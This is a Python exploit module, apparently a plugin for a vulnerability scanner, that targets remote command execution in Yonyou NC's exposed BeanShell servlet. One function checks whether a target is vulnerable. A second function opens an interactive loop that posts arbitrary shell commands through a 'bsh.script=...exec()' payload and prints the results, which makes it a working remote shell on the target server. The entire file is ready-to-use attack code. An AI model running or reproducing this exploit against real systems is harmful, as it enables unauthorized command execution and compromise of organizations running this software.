import requests
import urllib, re

def verify(url):
    relsult = {
        'name': '用友NC bsh.servlet.BshServlet 命令执行(2022HVV)',
        'vulnerable': False,
        'url': url,
        'attack': True,
        'about': 'https://blog.csdn.net/weixin_44146996/article/details/117450104',
    }
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, '/servlet//~ic/bsh.servlet.BshServlet')
    try:
        rep = requests.get(vurl, headers=headers, verify=False, timeout=timeout)
        if rep.status_code == 200 and re.search('BeanShell Test Servle', rep.text):
            relsult['vulnerable'] = True
            relsult['vurl'] = vurl
        return relsult
    except:
        return relsult

def attack(url):
    timeout = 10
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, '/servlet//~ic/bsh.servlet.BshServlet')
    cmd = ''
    print('[+] 尝试执行命令 ......')
    try:
        print('[+] 开始执行命令，输入exit退出!')
        while True:
            try:
                cmd = input('执行命令 > ')
                if cmd == 'exit':
                    break
                data = 'bsh.script=print("$");exec("{0}");print("$");'.format(cmd)
                rep = requests.post(vurl, timeout=timeout, verify=False, headers=headers, data=data)
                print('[*] Output:', re.findall('\$([^$]+)\$', rep.text)[0])
            except:
                print('[-] 执行命令超时,(timeout > {0})'.format(timeout))
                continue
        return True
    except:
        return False